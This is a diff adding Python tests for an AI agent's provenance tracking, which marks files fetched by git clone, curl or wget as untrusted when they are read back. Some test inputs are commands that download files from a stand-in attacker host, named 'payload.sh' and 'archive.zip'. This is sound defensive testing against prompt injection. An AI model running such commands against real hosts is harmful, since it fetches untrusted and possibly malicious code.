@@ -8,12 +8,17 @@ NOT a regex scan — it's an unconditional architectural mark on every result
 from a known-untrusted source.
 """
 
+import os
+
 import pytest
 
 from agent.tool_dispatch_helpers import (
+    _command_touches_untrusted_root,
+    _extract_fetch_roots,
     _extract_file_mutation_targets,
     _is_untrusted_tool,
     _maybe_wrap_untrusted,
+    _path_under_any_root,
     make_tool_result_message,
 )
 
@@ -294,3 +299,107 @@ class TestFileMutationTargets:
             },
         )
         assert targets == ["old/name.py", "new/name.py"]
+
+
+# =========================================================================
+# Filesystem provenance tracking — read_file/terminal results targeting a
+# path populated by an earlier external fetch get the untrusted wrapper too.
+# =========================================================================
+
+
+class TestExtractFetchRoots:
+    def test_git_clone_with_explicit_dest(self):
+        roots = _extract_fetch_roots("git clone https://github.com/foo/bar.git mydir", "/work")
+        assert roots == [os.path.normpath("/work/mydir")]
+
+    def test_git_clone_derives_dest_from_url(self):
+        roots = _extract_fetch_roots("git clone https://github.com/foo/bar.git", "/work")
+        assert roots == [os.path.normpath("/work/bar")]
+
+    def test_gh_repo_clone_derives_dest(self):
+        roots = _extract_fetch_roots("gh repo clone foo/bar", "/work")
+        assert roots == [os.path.normpath("/work/bar")]
+
+    def test_curl_with_output_flag(self):
+        roots = _extract_fetch_roots("curl -o payload.sh https://evil.example/x.sh", "/work")
+        assert roots == [os.path.normpath("/work/payload.sh")]
+
+    def test_wget_derives_dest_from_url_when_no_flag(self):
+        roots = _extract_fetch_roots("wget https://evil.example/archive.zip", "/work")
+        assert roots == [os.path.normpath("/work/archive.zip")]
+
+    def test_unrelated_command_yields_no_roots(self):
+        assert _extract_fetch_roots("ls -la src/", "/work") == []
+        assert _extract_fetch_roots("", "/work") == []
+
+
+class TestPathUnderAnyRoot:
+    def test_exact_root_match(self):
+        assert _path_under_any_root("/work/mydir", ["/work/mydir"])
+
+    def test_nested_file_under_root(self):
+        assert _path_under_any_root("/work/mydir/sub/README.md", ["/work/mydir"])
+
+    def test_sibling_path_not_matched(self):
+        # /work/mydir2 must not match root /work/mydir (no prefix-without-separator bugs).
+        assert not _path_under_any_root("/work/mydir2/file.txt", ["/work/mydir"])
+
+    def test_no_roots_returns_false(self):
+        assert not _path_under_any_root("/work/mydir/file.txt", [])
+
+
+class TestCommandTouchesUntrustedRoot:
+    def test_direct_read_of_cloned_file(self):
+        roots = {os.path.normpath("/work/mydir")}
+        assert _command_touches_untrusted_root("cat mydir/README.md", "/work", roots)
+
+    def test_cd_into_cloned_dir_then_read(self):
+        roots = {os.path.normpath("/work/mydir")}
+        assert _command_touches_untrusted_root("cd mydir && cat NOTES.txt", "/work", roots)
+
+    def test_unrelated_command_not_flagged(self):
+        roots = {os.path.normpath("/work/mydir")}
+        assert not _command_touches_untrusted_root("cat src/main.py", "/work", roots)
+
+    def test_no_roots_never_flagged(self):
+        assert not _command_touches_untrusted_root("cat mydir/README.md", "/work", set())
+
+
+class TestFsProvenanceEndToEnd:
+    """Exercise the actual gap the security report identified: content from
+    an externally-fetched path must be wrapped as untrusted whether it's
+    read back via ``read_file`` or ``terminal`` — not just ``web_extract``.
+    """
+
+    def test_read_file_targeting_cloned_repo_is_wrapped(self):
+        roots = {os.path.normpath("/work/mydir")}
+        untrusted = _path_under_any_root(
+            os.path.normpath("/work/mydir/README.md"), roots
+        )
+        msg = make_tool_result_message(
+            "read_file", SAMPLE_LONG_TEXT, "call_5", path_untrusted=untrusted
+        )
+        assert msg["content"].startswith('<untrusted_tool_result source="read_file">')
+
+    def test_read_file_outside_cloned_repo_not_wrapped(self):
+        roots = {os.path.normpath("/work/mydir")}
+        untrusted = _path_under_any_root(
+            os.path.normpath("/work/src/main.py"), roots
+        )
+        msg = make_tool_result_message(
+            "read_file", SAMPLE_LONG_TEXT, "call_6", path_untrusted=untrusted
+        )
+        assert msg["content"] == SAMPLE_LONG_TEXT
+
+    def test_terminal_cat_of_cloned_file_is_wrapped(self):
+        roots = _extract_fetch_roots(
+            "git clone https://github.com/foo/bar.git mydir", "/work"
+        )
+        roots_set = set(roots)
+        untrusted = _command_touches_untrusted_root(
+            "cat mydir/README.md", "/work", roots_set
+        )
+        msg = make_tool_result_message(
+            "terminal", SAMPLE_LONG_TEXT, "call_7", path_untrusted=untrusted
+        )
+        assert msg["content"].startswith('<untrusted_tool_result source="terminal">')
